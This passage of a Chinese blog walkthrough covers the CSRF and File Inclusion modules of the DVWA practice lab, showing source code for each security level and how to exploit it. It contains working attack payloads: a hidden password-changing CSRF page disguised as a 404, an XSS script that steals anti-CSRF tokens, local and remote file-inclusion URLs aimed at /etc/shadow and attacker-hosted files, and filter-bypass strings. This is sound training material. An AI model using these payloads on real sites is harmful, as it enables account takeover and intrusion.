mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>服务器通过cookie验证身份，收到的修改密码请求后，会检查参数 <code>password_new</code> 与 <code>password_conf</code> 是否相同，相同则修改密码，并没有防范CSRF机制</p>
<h3 id="漏洞利用-6"><a href="#漏洞利用-6" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>构造链接 <code>http://dvwa.loacl/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#</code> 。</p>
<p>受害者点击链接后，他的密码就会被修改成 <code>hack</code> ,通过链接可直观的就看到内容 。</p>
<p><strong>由于服务器需要使用到Cookie验证身份，而Cookie受浏览器影响，若攻击者与受害者使用不同种的浏览器就无法达成攻击效果 。</strong></p>
<p>可用以下方式伪装</p>
<ul>
<li>可制作短链接来隐藏URL</li>
<li>构造攻击页面</li>
</ul>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://dvwa.loacl/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>
<h2 id="Medium-2"><a href="#Medium-2" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码-8"><a href="#源码-8" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Checks to see where the request came from</span></span><br><span class="line">    <span class="keyword">if</span>( stripos( <span class="variable">$_SERVER</span>[ <span class="string">&#x27;HTTP_REFERER&#x27;</span> ] ,<span class="variable">$_SERVER</span>[ <span class="string">&#x27;SERVER_NAME&#x27;</span> ]) !== <span class="literal">false</span> ) &#123;</span><br><span class="line">        <span class="comment">// Get input</span></span><br><span class="line">        <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">        <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Do the passwords match?</span></span><br><span class="line">        <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">            <span class="comment">// They do!</span></span><br><span class="line">            <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">            <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Update the database</span></span><br><span class="line">            <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">            <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Feedback for the user</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Issue with passwords matching</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Didn&#x27;t come from a trusted source</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;That request didn&#x27;t look correct.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p><code>stripos(string pattern,string string)</code> 检查 <code>string</code> 在 <code>pattern</code> 中出现的位置（不区分大小写)，如果有返回 <code>true</code>，没有返回 <code>false</code> 。</p>
<p>检查保留变量 <code>HTTP_REFERER</code> (<code>http</code> 包头的 <code>Referer</code> 参数的值，表源地址) 中是否包含 <code>SERVER_NAME</code> (<code>http</code> 包头的 <code>Host</code> 参数，及要访问的主机名) ，只检查了是否含有需要访问主机的主机名，只要 <code>referer</code> 中出现 <code>Host</code> 就可以正常操作 。</p>
<h3 id="漏洞利用-7"><a href="#漏洞利用-7" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>Host dvwa.loacl</p>
<p>Referer <a href="http://hack.loacl/dvwa.loacl.html">http://hack.loacl/dvwa.loacl.html</a></p>
<p>构造 <code>dvwa.loacl.html</code>  的 <code>CSRF</code> 网页文件，放到 <code>hack.loacl</code> 上通过访问该文件即可 。</p>
<figure class="highlight html"><figcaption><span>192.168.56.102.html</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;http://dvwa.loacl/dvwa/vulnerabilities/csrf/?password_new=hack&amp;password_conf=hack&amp;Change=Change#&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> <span class="attr">style</span>=<span class="string">&quot;display:none;&quot;</span>/&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>404<span class="tag">&lt;<span class="name">h1</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>file not found.<span class="tag">&lt;<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造的 <code>dvwa.loacl.html</code> 容易被发现，可使用 <code>URL</code> 转码，将 <code>dvwa.loacl.html</code> 转义为 <code>%64%76%77%61%2e%6c%6f%63%61%6c%2e%68%74%6d%6c</code>  。</p>
<p>构造链接 <code>http://hack.loacl/%64%76%77%61%2e%6c%6f%63%61%6c%2e%68%74%6d%6c</code></p>
<h2 id="High-2"><a href="#High-2" class="headerlink" title="High"></a>High</h2><h3 id="源码-9"><a href="#源码-9" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do the passwords match?</span></span><br><span class="line">    <span class="keyword">if</span>( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &#123;</span><br><span class="line">        <span class="comment">// They do!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update the database</span></span><br><span class="line">        <span class="variable">$insert</span> = <span class="string">&quot;UPDATE `users` SET password = &#x27;<span class="subst">$pass_new</span>&#x27; WHERE user = &#x27;&quot;</span> . dvwaCurrentUser() . <span class="string">&quot;&#x27;;&quot;</span>;</span><br><span class="line">        <span class="variable">$result</span> = mysqli_query(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$insert</span> ) <span class="keyword">or</span> <span class="keyword">die</span>( <span class="string">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) : ((<span class="variable">$___mysqli_res</span> = mysqli_connect_error()) ? <span class="variable">$___mysqli_res</span> : <span class="literal">false</span>)) . <span class="string">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    ((is_null(<span class="variable">$___mysqli_res</span> = mysqli_close(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]))) ? <span class="literal">false</span> : <span class="variable">$___mysqli_res</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>加入 <code>Anti-CSRF token</code> 机制，用户每次访问该页，服务器会返回一个随机 token ，向服务器发起请求时需提交 token 参数，服务器收到请求后先检查 token 只有 token 正确才处理请求</p>
<h3 id="漏洞利用-8"><a href="#漏洞利用-8" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>攻击页需要获取修改密码页的 <code>token</code> 这属于跨域请求，浏览器已经禁止，只能另寻它法 。</p>
<ul>
<li>将攻击页上传到该服务器目录下，属同域，都能上传到该服务器目录下了何不直接拿权限呢</li>
<li>利用 XSS 获取 token</li>
</ul>
<p>利用 XSS 需要该网站存在 XSS </p>
<figure class="highlight js"><figcaption><span>xss.js</span></figcaption><table><tr><td class="code"><pre><span class="line">alert(<span class="built_in">document</span>.cookie);</span><br><span class="line"><span class="keyword">var</span> theUrl = <span class="string">&#x27;http://dvwa.local/vulnerabilities/csrf/&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">window</span>.XMLHttpRequest) &#123;</span><br><span class="line">    xmlhttp = <span class="keyword">new</span> XMLHttpRequest();</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    xmlhttp = <span class="keyword">new</span> ActiveXObject(<span class="string">&quot;Microsoft.XMLHTTP&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> count = <span class="number">0</span>;</span><br><span class="line">xmlhttp.withCredentials = <span class="literal">true</span>;</span><br><span class="line">xmlhttp.onreadystatechange=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(xmlhttp.readyState ==<span class="number">4</span> &amp;&amp; xmlhttp.status==<span class="number">200</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">var</span> text = xmlhttp.responseText;</span><br><span class="line">        <span class="keyword">var</span> regex = <span class="regexp">/user_token\&#x27; value\=\&#x27;(.*?)\&#x27; \/\&gt;/</span>;</span><br><span class="line">        <span class="keyword">var</span> match = text.match(regex);</span><br><span class="line">        <span class="built_in">console</span>.log(match);</span><br><span class="line">        alert(match[<span class="number">1</span>]);</span><br><span class="line">            <span class="keyword">var</span> token = match[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">var</span> new_url = <span class="string">&#x27;http://dvwa.local/vulnerabilities/csrf/?user_token=&#x27;</span>+token+<span class="string">&#x27;&amp;password_new=hack&amp;password_conf=hacktest&amp;Change=Change&#x27;</span>;</span><br><span class="line">                <span class="keyword">if</span>(count==<span class="number">0</span>)&#123;</span><br><span class="line">                    count++;</span><br><span class="line">                    xmlhttp.open(<span class="string">&quot;GET&quot;</span>,new_url,<span class="literal">false</span>);</span><br><span class="line">                    xmlhttp.send();</span><br><span class="line">                &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line">xmlhttp.open(<span class="string">&quot;GET&quot;</span>,theUrl,<span class="literal">false</span>);</span><br><span class="line">xmlhttp.send();</span><br></pre></td></tr></table></figure>
<p><code>xss.js</code> 放置在攻击者 <code>hack.local</code> 上，配合同<code>dvwa.local</code> 存在的<code>DOM XSS</code> 实现跨域请求来获取用户 token 受害者访问: <code>http://dvwa.local/vulnerabilities/xss_d/?default=English #</code> 诱导点击后修改密码为 <code>hack</code> 。</p>
<h2 id="Impossible-2"><a href="#Impossible-2" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="源码-10"><a href="#源码-10" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_GET</span>[ <span class="string">&#x27;Change&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Check Anti-CSRF token</span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input</span></span><br><span class="line">    <span class="variable">$pass_curr</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_current&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_new</span>  = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_new&#x27;</span> ];</span><br><span class="line">    <span class="variable">$pass_conf</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;password_conf&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Sanitise current password input</span></span><br><span class="line">    <span class="variable">$pass_curr</span> = stripslashes( <span class="variable">$pass_curr</span> );</span><br><span class="line">    <span class="variable">$pass_curr</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_curr</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">    <span class="variable">$pass_curr</span> = md5( <span class="variable">$pass_curr</span> );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the current password is correct</span></span><br><span class="line">    <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;SELECT password FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#x27;</span> );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_curr</span>, PDO::PARAM_STR );</span><br><span class="line">    <span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Do both new passwords match and does the current password match the user?</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="variable">$pass_new</span> == <span class="variable">$pass_conf</span> ) &amp;&amp; ( <span class="variable">$data</span>-&gt;rowCount() == <span class="number">1</span> ) ) &#123;</span><br><span class="line">        <span class="comment">// It does!</span></span><br><span class="line">        <span class="variable">$pass_new</span> = stripslashes( <span class="variable">$pass_new</span> );</span><br><span class="line">        <span class="variable">$pass_new</span> = ((<span class="keyword">isset</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class="variable">$GLOBALS</span>[<span class="string">&quot;___mysqli_ston&quot;</span>],  <span class="variable">$pass_new</span> ) : ((trigger_error(<span class="string">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class="string">&quot;&quot;</span> : <span class="string">&quot;&quot;</span>));</span><br><span class="line">        <span class="variable">$pass_new</span> = md5( <span class="variable">$pass_new</span> );</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Update database with new password</span></span><br><span class="line">        <span class="variable">$data</span> = <span class="variable">$db</span>-&gt;prepare( <span class="string">&#x27;UPDATE users SET password = (:password) WHERE user = (:user);&#x27;</span> );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:password&#x27;</span>, <span class="variable">$pass_new</span>, PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;bindParam( <span class="string">&#x27;:user&#x27;</span>, dvwaCurrentUser(), PDO::PARAM_STR );</span><br><span class="line">        <span class="variable">$data</span>-&gt;execute();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Feedback for the user</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Password Changed.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Issue with passwords matching</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Passwords did not match or current password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Generate Anti-CSRF token</span></span><br><span class="line">generateSessionToken();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用 PDO 技术防范 SQL 注入，要求用户输入原始密码防范 CSRF 攻击者在不知道原始密码情况下无法进行 CSRF 攻击 。</p>
<h1 id="File-Inclusion-文件包含"><a href="#File-Inclusion-文件包含" class="headerlink" title="File Inclusion (文件包含)"></a>File Inclusion (文件包含)</h1><h2 id="Low-3"><a href="#Low-3" class="headerlink" title="Low"></a>Low</h2><h3 id="源码-11"><a href="#源码-11" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>服务端对 <code>page</code> 参数没有任何过滤检查 。</p>
<p>服务器包含文件时，不管文件后缀名是否是 php ,都将当作 php 文件执行，若内容确为 php 正常执行并返回结果，若不是，则原封不动将内容打印，所以文件包含漏洞常常会导致任意文件读取与任意文件执行。</p>
<h3 id="漏洞利用-9"><a href="#漏洞利用-9" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><ul>
<li>本地文件包含</li>
</ul>
<p>构造url : <code>http://dvwa.local/dvwa/vulnerabilities/fi/?page=/etc/shadow</code> 。</p>
<p>报错显示没有这个文件，说明服务器系统不是 Linux ,但同时暴露了服务器文件的绝对路径 <code>C:\Install\phpstudy\PHPTutorial\WWW\DVWA\vulnerabilities\fi\index.php</code> 。</p>
<p>构造绝对路径url: <code>http://dvwa.local/vulnerabilities/fi/?page=C:\Install\phpstudy\PHPTutorial\WWW\DVWA\php.ini</code> 。</p>
<p>构造相对路径url: <code>http://dvwa.local/vulnerabilities/fi/?page=C:\Install\phpstudy\PHPTutorial\WWW\DVWA\php.ini</code> 读取到该文件的内容。</p>
<ul>
<li>远程文件包含</li>
</ul>
<p>服务器配置中，选项 <code>alLow_url_fopen</code> 与 <code>alLow_url_include</code> 为开启状态时，服务器会允许包含远程服务器上的文件，如果对文件来源没有检查，就容易导致任意远程代码执行。</p>
<p>在远程服务器 <code>hack.local</code> 上传 <code>phpinfo.txt</code> 。</p>
<figure class="highlight php"><figcaption><span>pre-hooks.txt</span></figcaption><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">phpinfo();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>构造url <code>http://dvwa.local/dvwa/vulnerabilities/fi/page=http://hack.local/phpinfo.txt</code> 。</p>
<p><code>http://hack.local/phpinfo.txt</code> &gt;&gt; <code>%68%74%74%70%3a%2f%2f%68%61%63%6b%2e%6c%6f%63%61%6c%2f%70%68%70%69%6e%66%6f%2e%74%78%74</code> &gt;&gt; <code>http://dvwa.local/dvwa/vulnerabilities/fi/page=%68%74%74%70%3a%2f%2f%68%61%63%6b%2e%6c%6f%63%61%6c%2f%70%68%70%69%6e%66%6f%2e%74%78%74</code> </p>
<h2 id="Medium-3"><a href="#Medium-3" class="headerlink" title="Medium"></a>Medium</h2><h3 id="源码-12"><a href="#源码-12" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="variable">$file</span> = str_replace( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>增加了 <code>str_replace</code> 函数对 <code>page</code> 参数进行处理，将 <code>http://</code> 、<code>https://</code> 、<code>../</code>、<code>..\</code> 替换成空字符(删除)。</p>
<h3 id="漏洞利用-10"><a href="#漏洞利用-10" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p><code>hthttp://tp://</code> , <code>..././</code> 等经过过滤后成为： <code>http://</code> , <code>../</code></p>
<h2 id="High-3"><a href="#High-3" class="headerlink" title="High"></a>High</h2><h3 id="源码-13"><a href="#源码-13" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="keyword">if</span>( !fnmatch( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>使用了 <code>fnmatch</code> 函数检查 <code>page</code> 参数，要求 <code>page</code> 参数的开头必须是 file ,服务器才会去包含相应的文件。依然可以利用 file 协议绕过防护策略，需要结果文件上传，将文件上传到服务器，并能获取到完整的路径，即可利用文件包含漏洞执行上传的文件。</p>
<h2 id="Impossible-3"><a href="#Impossible-3" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="源码-14"><a href="#源码-14" class="headerlink" title="源码"></a>源码</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Only allow include.php or file&#123;1..3&#125;.php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file1.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file2.php&quot;</span> &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;file3.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>简单粗暴，<code>page</code> 参数必须为 <code>include.php</code>、<code>file1.php</code>、<code>file2.php</code>、<code>file3.php</code> 之一，彻底杜绝了文件包含漏洞。</p>
